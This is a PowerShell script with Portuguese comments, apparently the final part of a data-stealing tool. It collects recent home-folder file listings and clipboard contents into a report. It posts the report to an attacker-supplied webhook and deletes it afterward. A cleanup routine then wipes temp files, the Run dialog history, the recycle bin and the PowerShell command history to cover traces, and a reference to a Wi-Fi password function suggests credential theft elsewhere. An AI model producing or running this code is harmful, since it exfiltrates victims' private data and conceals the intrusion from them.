        $recentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue |
                       Sort-Object LastWriteTime -Descending |
                       Select-Object -First 30 FullName, LastWriteTime, Length
        if ($recentFiles) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  ARQUIVOS RECENTES (Home):")
            foreach ($rf in $recentFiles) {
                $sizeMB = [math]::Round($rf.Length / 1MB, 1)
                $null = $sb.AppendLine("    - $($rf.FullName) | Mod: $($rf.LastWriteTime) | Tam: ${sizeMB}MB")
            }
        }
    } catch { }

    # Clipboard
    try {
        $clip = Get-Clipboard -ErrorAction SilentlyContinue
        if ($clip) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  CLIPBOARD ATUAL:")
            $null = $sb.AppendLine("    $clip")
        }
    } catch { }

    # ===========================
    # FINAL
    # ===========================
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine($sep)
    $null = $sb.AppendLine("FIM DO RELATÓRIO")
    $null = $sb.AppendLine($sep)

    # Salva o relatório no arquivo especificado
    try {
        # Garante que o diretório de exportação existe
        if (-not (Test-Path -Path $ExportDir -PathType Container)) {
            New-Item -Path $ExportDir -ItemType Directory -Force | Out-Null
        }
        
        # Salva o conteúdo do relatório
        $sb.ToString() | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
        Write-Host "Relatório salvo em: $OutputFile"
    } catch {
        Write-Error "Falha ao salvar relatório em $OutputFile`: $_"
        exit 1
    }
    
    return $OutputFile
}

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Envia e apaga o arquivo após envio
    try {
        # Lê o conteúdo do arquivo
        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8

        # Monta a string no formato "Titulo: conteudo"
        $payloadText = "${Titulo}: ${fileContent}"

        # Converte a string montada para bytes UTF-8
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)

        # Envia a requisição
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
}


######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace($out)) {
            $out =$OutputFile
        }

        Write-Host "Arquivo gerado em: $out"
        return $out
    } catch {
        Write-Error "Erro ao gerar arquivo: $_"
        exit 1
    }
}


####### Enviar ao Webhook ######
function Send-DumpToWebhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$WebhookUrl,

        [Parameter(Mandatory = $false)]
        [string]$Title = "Relatório de Dump",

        [Parameter(Mandatory = $false)]
        [string]$ExportDir,

        [Parameter(Mandatory = $false)]
        [switch]$RemoveExportDir
    )

    # Executa apenas se a URL do Webhook for informada
    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
        try {
            Write-Host "Enviando para webhook: $WebhookUrl"

            # Monta os parâmetros dinamicamente (Splatting)
            $splatParams = @{
                FilePath   = $FilePath
                WebhookUrl = $WebhookUrl
                Titulo     = $Title
            }

            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }

            # Executa a função interna de envio
            $sendResult = send_file_to_webhook @splatParams

            # Exibe o resultado checando o retorno do objeto
            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }

                Write-Host "Envio concluído: $fileSent em$timeSent"
            } else {
                Write-Host "Envio concluído com sucesso."
            }
        } catch {
            Write-Error "Erro durante envio para webhook: $_"
        }
    }
}

  

##### Funcao de Limpeza ####
function Clear-All {
    $ea = 'SilentlyContinue'
    rm "$env:TEMP\*" -r -fo -ea $ea
    rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
    Clear-RecycleBin -fo -ea $ea
    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
    echo "Limpeza concluída!"
}

#### Executa ####
$out = Invoke-DataDump `
    -DumpCommand { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
    -OutputFile $OutputFileDefault `
    -ExportDir $ExportDirDefault

Send-DumpToWebhook `
    -FilePath $out `
    -WebhookUrl $WebhookUrl `
    -Title "System Info" `
    -ExportDir $ExportDirDefault `
    -RemoveExportDir

Clear-All